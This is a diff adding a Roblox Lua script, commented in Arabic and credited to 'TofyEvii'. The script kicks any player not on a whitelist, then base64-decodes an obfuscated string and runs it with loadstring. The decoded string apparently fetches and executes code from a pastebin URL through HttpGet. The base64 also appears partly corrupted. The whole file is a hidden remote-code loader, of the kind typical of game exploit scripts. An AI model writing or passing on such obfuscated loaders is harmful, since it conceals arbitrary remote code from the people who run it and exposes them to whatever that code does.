@@ -1,0 +1,34 @@
+-- سكربت مشفر ومقيد بواسطة: طوفي إيفي
+-- جميع الحقوق محفوظة © 2025
+-- حسابي: @TofyEvii
+
+local allowedUsers = {
+    ["TofyEvii"] = true,
+    ["AnotherAllowedUser"] = true -- أضف أي مستخدمين آخرين هنا
+}
+
+local player = game:GetService("Players").LocalPlayer
+if not allowedUsers[player.Name] then
+    game:GetService("Players").LocalPlayer:Kick("🚫 هذا السكربت محمي بواسطة طوفي إيفي. ليس لديك صلاحية استخدامه.")
+    return
+end
+
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+function dec(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local code = dec("LS0g2YXYp9mGINmF2KfZhdiDYo9mB2YrYqNmK2KkgOiDYqNin2YTYs9mIINmE2KjYsdipINiz2YTYp9ixINin2YTYr9mC2Kog4oCTigJMgMjAyNQotLSDZgdmK2YQg2KfZhNmC2Kcg2KfYp9ix2YXYp9mK2Kcg2KfZhNin2YXYrNmF2KfYqiDYp9mE2YjZitixINmF2KfZhNin2YXYrNmF2KfYqiBMAAtMb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0g2NEhRUU5CIiwgdHJ1ZSkpKCkK")
+loadstring(code)()
